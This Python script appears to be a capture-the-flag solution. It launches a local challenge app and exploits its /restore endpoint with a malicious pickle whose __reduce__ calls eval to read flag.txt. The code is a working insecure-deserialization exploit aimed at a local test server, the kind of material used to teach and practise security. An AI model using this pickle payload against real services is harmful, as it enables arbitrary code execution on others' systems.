#!/usr/bin/env python3
from __future__ import annotations

import base64, os, pickle, socket, subprocess, sys, time, urllib.parse, urllib.request
from pathlib import Path


class Evil:
    def __reduce__(self):
        return (eval, ('open("flag.txt").read()',))


def start(app: Path, port: int):
    env = os.environ.copy()
    env["PORT"] = str(port)
    proc = subprocess.Popen([sys.executable, str(app)], cwd=app.parent, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for _ in range(50):
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=0.1):
                return proc
        except OSError:
            time.sleep(0.1)
    raise SystemExit("server not ready")


def main() -> None:
    root = Path(__file__).resolve().parents[1]
    proc = start(root / "attachments" / "app.py", 18089)
    try:
        blob = base64.urlsafe_b64encode(pickle.dumps(Evil())).decode()
        body = urllib.request.urlopen(f"http://127.0.0.1:18089/restore?blob={urllib.parse.quote(blob)}").read().decode()
        print(body.strip())
    finally:
        proc.terminate()
        proc.wait(timeout=5)


if __name__ == "__main__":
    main()
